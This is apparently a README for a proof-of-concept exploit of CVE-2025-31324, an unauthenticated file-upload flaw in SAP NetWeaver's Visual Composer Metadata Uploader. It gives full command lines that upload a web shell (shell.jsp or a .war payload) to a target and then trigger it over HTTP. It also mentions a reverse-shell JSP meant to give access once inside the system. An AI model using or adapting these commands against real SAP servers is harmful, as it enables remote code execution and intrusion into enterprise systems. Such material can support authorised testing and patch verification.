# CVE-2025-31324_PoC
Proof-of-Concept for CVE-2025-31324: Unauthenticated upload in SAP NetWeaver Visual Composer Metadata Uploader


This script performs:
  1. File upload to the vulnerable endpoint (via Upload host/port)
  2. Optional trigger via HTTP GET (via Trigger host/port)
  3. Basic response validation/logging

Usage example:
  python3 PoC.py \
    --host sap.example.com --port 50000 \
    --endpoint /irj/portal/sap/bc/webdynpro/sap/ZWDC_METADATA_UPLDR \
    --file EvilPayload.war \
    --trigger-path /irj/portal/irj/servlet_jsp/irj/root/EvilPayload/shell.jsp \
    --trigger-host sap.example.com --trigger-port 50001 --trigger-https true \
    --bypass-portal

  python3 PoC.py --host sap.example.com --port 50000 \
    --endpoint /developmentserver/metadatauploader \
    --file shell.jsp \
    --trigger-path /visual_composer/shell.jsp \
    --trigger-host sap.example.com --trigger-port 50001 --trigger-https

You also have the ability to upload a .war file if that is how you would like to execute. cache.jsp is a reverse shell that will give you aceess once inside the system. (Still working out issues there)
